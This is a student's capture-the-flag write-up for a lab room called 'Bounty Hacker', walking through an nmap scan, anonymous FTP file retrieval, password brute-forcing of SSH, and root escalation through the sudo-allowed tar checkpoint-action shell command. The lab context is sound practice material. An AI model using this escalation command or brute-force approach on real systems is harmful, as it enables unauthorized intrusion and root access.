---
Title: SWS101 BOUNTY HACKER
categories: [SWS101,CTF Journal]
tags: SWS 101
---

![bounty hacks](../assets/bountyhacker/bountyhacker.png)

### Penetration Test Report
Target: 10.10.21.191

### Information Gathering Phase

Port Scanning with Nmap:

    nmap -sV -vv 10.10.21.191


![nmap](../assets/bountyhacker/bountynmap.png)

![nmap 2](../assets/bountyhacker/bountynmap2.png)

    PORT      STATE  SERVICE         REASON       VERSION
    20/tcp    closed ftp-data        conn-refused
    21/tcp    open   ftp             syn-ack      vsftpd 3.0.3
    22/tcp    open   ssh             syn-ack      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    80/tcp    open   http            syn-ack      Apache httpd 2.4.18 ((Ubuntu))



Found 3 ports open.

![web page](../assets/bountyhacker/bountywebpage.png)

I couldn't find any sensetive information here.

lets go for open port 21.

![ftp login](../assets/bountyhacker/bountyftplogin.png)

![lftp login](../assets/bountyhacker/bountyftplogin.png)

Found 2 files, lets get it...

![ftp error](../assets/bountyhacker/bountyftperror.png)

I don't know why ftp is giving not working. So I tried to use it's alternative which is lftp.  It works same as ftp. 

![lftp ls](../assets/bountyhacker/bountylftpls.png)

I am getting same output as ftp. 

![file](../assets/bountyhacker/bountyftpfile.png)

![task file](../assets/bountyhacker/task.png)

I guess "lin" is the user because he was the one who wrote this file.

![locks file](../assets/bountyhacker/locks.png)

This looks like list of password for the lin which we can use for shh login.

![lin hydra](../assets/bountyhacker/bountylinpass.png)

I got the password for user lin. Now I guess I can login into ssh.

![ssh login](../assets/bountyhacker/bountysshlogin.png)

Login successful!!

![user password](../assets/bountyhacker/bountyuser.png)

### Privilege Escalation

![tar](../assets/bountyhacker/bountylintar.png)


lin@bountyhacker:~/Desktop$ sudo -l

    User lin may run the following commands on bountyhacker:
        (root) /bin/tar


It says that I can run tar command.

![tar command](../assets/bountyhacker/bountytar.png)

![sudo tar](../assets/bountyhacker/bountytarcmd.png)

    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

![sudo tar](../assets/bountyhacker/bountytarls.png)

OHH.. I got the root shell!!

![foot flag](../assets/bountyhacker/bountyroottxt.png)

![yeah](../assets/bountyhacker/bountyyeah.gif)

### Final Thought

The room has been quite engaging so far, and I've successfully navigated the challenges it presented. My only setback was connecting to the FTP server, but I discovered an alternative to FTP, which is LFTP. I'm eager to proceed to the next room.

![bye](../assets/bountyhacker/bountybye.gif)